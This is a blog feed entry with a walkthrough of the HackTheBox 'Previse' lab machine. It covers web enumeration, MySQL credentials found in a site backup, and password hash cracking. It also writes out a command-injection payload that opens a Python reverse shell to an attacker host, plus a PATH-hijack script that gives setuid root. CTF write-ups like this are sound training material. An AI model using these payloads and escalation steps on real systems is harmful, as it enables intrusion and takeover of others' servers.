channel.title: HackTheBox on RoundofThree
channel.description: Recent content in HackTheBox on RoundofThree

item.title: Previse - HackTheBox machine
item.description:
• Rank: easy

These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
item.content:
• Rank: easy

These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Enumeration

Previse walkthrough

Enumeration

  1. Nmap discovers tcp 22 and 80 ports.
  2. http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt. Try with SQLi:
sqlmap -r request.txt -p password 
# (try with username too)

No SQLi flaws discovered by sqlmap.

  1. Fuzz the request path. wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt –hc=404 http://previse.htb

Interesting files: index.php – 302 Found –> RESPONSE1 (see below for details) login.php config.php download.php – 302 –> login.php header.php footer.php status.php – 302 –> MySQL server is running! nav.php accounts.php – 302 –> Create an admin account files.php – 302 –> backup.zip YEAH!!! Site backups are very welcome!

  1. Intercept request packet with BurpSuite and intercept the response. See annotations above.

RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).

  1. The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php. MySQL credentials: root mySQL_p@ssw0rd!:) DBname: previse

But we can only access the database from localhost… Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it’s specific to MySQL service.

  1. Revise all files. Look at logs.php. exec() promises a command injection opportunity.

The interesting part is here:

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

We can trigger a reverse shell.

Target command: python log_process.py comma;python3 -c ‘import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACKER_IP”,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")’

Change the POST param in Burpsuite: delim=comma;python3+-c+‘import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")’

  1. To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

> use previse;
> show tables;  # accounts and files
> select * from accounts;
# columns id, username, password and created_at

So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.

hashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Same but with –show

username = m4lwhere
hash = $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.
password = ilovecody112235!

Note that john doesn’t support non-printable characters in hash.

  1. SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f

Privilege escalation

  1. sudo -l reveals the script /opt/scripts/access_backup.sh.

  2. Copy to local machine:

scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .

By looking at this file, we find command path vulnerability.

  1. We can put a script named gzip in the current workdir and execute access_backup.sh as root.
cd /tmp
# set gzip to be bash with setuid bit
cat << EOF > gzip 
#!/bin/bash
cp /bin/bash /tmp/c
chmod u+s /tmp/c
EOF
  1. Now /tmp/c is a setuid bash.
/tmp/c -p (this flag sets the real userid as the effective userid)

root.txt: 23c44ab8465e7ff51a5fab75847e088b
